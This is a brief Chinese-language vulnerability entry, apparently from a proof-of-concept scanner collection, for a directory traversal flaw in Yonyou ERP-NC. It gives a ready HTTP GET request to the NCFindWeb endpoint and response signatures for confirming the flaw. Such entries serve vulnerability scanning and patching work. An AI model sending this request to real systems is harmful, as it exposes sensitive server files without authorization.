﻿# 用友 OA ERP-NC存在目录遍历漏洞

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：用友ERP-NC存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息

> 漏洞特征：

> 验证脚本：HTTP

```
GET /NCFindWeb?service=IPreAlertConfigService&filename= HTTP/1.1
```

> 响应代码特征：-1

> 响应内容特征：menu.jsp

> 上传文件定位：

> 验证文件来源：用友 OA ERP-NC存在目录遍历漏洞.poc
